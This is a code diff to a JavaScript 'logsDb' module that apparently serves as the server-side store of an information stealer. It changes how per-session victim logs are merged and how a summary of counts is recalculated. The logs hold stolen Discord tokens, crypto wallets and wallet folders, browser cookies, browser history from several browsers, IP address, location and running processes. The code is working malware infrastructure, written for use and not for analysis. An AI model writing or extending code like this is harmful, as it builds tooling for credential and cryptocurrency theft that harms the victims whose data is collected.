@@ -213,33 +213,70 @@ const logsDb = {
             const existingPcData = JSON.parse(existingLog.pc_data || '{}');
             const existingDataSummary = JSON.parse(existingLog.data_summary || '{}');
             
-            // Merge pcData (keep existing values, update with new non-null/non-empty values)
+            // Helper function to check if a value is actually provided (not just undefined)
+            const hasValue = (val) => val !== undefined && val !== null;
+            
+            // Merge pcData - use new data if provided, otherwise keep existing
             const mergedPcData = {
                 ...existingPcData,
-                // Override with new values if provided (non-null/non-empty)
-                screenSize: pcData.screenSize || existingPcData.screenSize,
-                dateTime: pcData.dateTime || existingPcData.dateTime,
-                ipAddress: pcData.ipAddress || existingPcData.ipAddress,
-                location: pcData.location || existingPcData.location,
-                systemInfo: pcData.systemInfo || existingPcData.systemInfo,
-                browserCookies: pcData.browserCookies || existingPcData.browserCookies,
-                // For arrays/lists, use new data if it exists and is non-empty, otherwise keep existing
-                runningProcesses: (pcData.runningProcesses && pcData.runningProcesses.length > 0) 
+                // Override with new values if they are provided (even if empty)
+                screenSize: hasValue(pcData.screenSize) ? pcData.screenSize : existingPcData.screenSize,
+                dateTime: hasValue(pcData.dateTime) ? pcData.dateTime : existingPcData.dateTime,
+                ipAddress: hasValue(pcData.ipAddress) ? pcData.ipAddress : existingPcData.ipAddress,
+                location: hasValue(pcData.location) ? pcData.location : existingPcData.location,
+                systemInfo: hasValue(pcData.systemInfo) ? pcData.systemInfo : existingPcData.systemInfo,
+                browserCookies: hasValue(pcData.browserCookies) ? pcData.browserCookies : existingPcData.browserCookies,
+                // For arrays/lists, use new data if provided (even if empty array), otherwise keep existing
+                runningProcesses: hasValue(pcData.runningProcesses) 
                     ? pcData.runningProcesses 
                     : (existingPcData.runningProcesses || []),
-                installedApps: (pcData.installedApps && pcData.installedApps.length > 0) 
+                installedApps: hasValue(pcData.installedApps) 
                     ? pcData.installedApps 
                     : (existingPcData.installedApps || []),
-                browserHistory: pcData.browserHistory || existingPcData.browserHistory,
-                discordTokens: pcData.discordTokens || existingPcData.discordTokens,
-                cryptoWallets: pcData.cryptoWallets || existingPcData.cryptoWallets,
-                cryptoWalletFolders: pcData.cryptoWalletFolders || existingPcData.cryptoWalletFolders
+                browserHistory: hasValue(pcData.browserHistory) 
+                    ? pcData.browserHistory 
+                    : (existingPcData.browserHistory || {}),
+                discordTokens: hasValue(pcData.discordTokens) 
+                    ? pcData.discordTokens 
+                    : existingPcData.discordTokens,
+                cryptoWallets: hasValue(pcData.cryptoWallets) 
+                    ? pcData.cryptoWallets 
+                    : existingPcData.cryptoWallets,
+                cryptoWalletFolders: hasValue(pcData.cryptoWalletFolders) 
+                    ? pcData.cryptoWalletFolders 
+                    : existingPcData.cryptoWalletFolders
             };
             
-            // Merge dataSummary
+            // Recalculate dataSummary from merged data to get accurate counts
+            let totalHistoryEntries = 0;
+            if (mergedPcData.browserHistory) {
+                totalHistoryEntries += mergedPcData.browserHistory.chromeHistory?.length || 0;
+                totalHistoryEntries += mergedPcData.browserHistory.firefoxHistory?.length || 0;
+                totalHistoryEntries += mergedPcData.browserHistory.edgeHistory?.length || 0;
+                totalHistoryEntries += mergedPcData.browserHistory.operaHistory?.length || 0;
+                totalHistoryEntries += mergedPcData.browserHistory.braveHistory?.length || 0;
+            }
+            
+            let cookieCount = 0;
+            if (mergedPcData.browserCookies) {
+                if (typeof mergedPcData.browserCookies === 'string') {
+                    try {
+                        const parsed = JSON.parse(mergedPcData.browserCookies);
+                        cookieCount = Array.isArray(parsed) ? parsed.length : Object.keys(parsed).length;
+                    } catch (e) {
+                        cookieCount = 0;
+                    }
+                } else if (Array.isArray(mergedPcData.browserCookies)) {
+                    cookieCount = mergedPcData.browserCookies.length;
+                }
+            }
+            
+            // Recalculate summary from merged data
             const mergedDataSummary = {
-                ...existingDataSummary,
-                ...dataSummary
+                historyEntries: totalHistoryEntries,
+                processes: (mergedPcData.runningProcesses || []).length,
+                installedApps: (mergedPcData.installedApps || []).length,
+                cookies: cookieCount
             };
             
             // Update the log
@@ -255,6 +292,8 @@ const logsDb = {
                 JSON.stringify(mergedPcData),
                 sessionId
             );
+            
+            console.log(`Updated log ${existingLog.id}: ${mergedDataSummary.processes} processes, ${mergedDataSummary.installedApps} apps, ${mergedDataSummary.historyEntries} history entries`);
             
             return existingLog.id;
         } else {
